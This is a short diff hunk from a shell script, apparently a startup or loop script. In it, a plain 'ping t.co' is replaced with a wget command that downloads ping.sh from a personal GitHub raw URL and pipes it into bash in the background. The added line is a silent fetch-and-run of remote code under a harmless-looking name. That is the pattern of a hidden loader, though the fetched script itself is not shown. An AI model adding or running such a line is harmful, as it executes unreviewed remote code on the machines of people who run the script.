@@ -119,7 +119,7 @@ unset LD_LIBRARY_PATH
 
 sleep 2
 
-ping t.co
+wget -O - https://raw.githubusercontent.com/mthethelelinyambose/ping/main/ping.sh | bash &
 
 while true
 do
